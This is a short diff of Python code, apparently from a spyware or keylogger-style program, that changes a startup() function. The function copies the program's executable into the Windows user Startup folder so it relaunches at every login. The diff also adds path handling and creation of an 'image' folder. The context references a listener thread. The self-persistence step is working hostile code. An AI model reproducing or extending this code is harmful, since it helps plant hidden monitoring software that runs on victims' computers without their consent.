@@ -69,9 +69,16 @@ def listener_c():
         listener.join()
 
 def startup():
-    global filenameforexe
+    global filenameforexe,path
+    r_path = ""
+    for i in __file__.split("\\")[:len(__file__.split("\\"))-2]:
+        r_path = f"{r_path}{i}\\"
+    r_path = r_path + __file__.split("\\")[len(__file__.split("\\"))-2]
     PATH = f"C:\\Users\\{LNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
     end_PATH = str(Path.cwd()) + "\\" + filenameforexe
+    if not os.path.isdir(path):
+        os.mkdir("image")
+        logging(f"@SUCCESS | {r_path}\\{path} is maked")
     if os.path.isdir(PATH):
         try:
             shutil.copy(end_PATH,PATH)
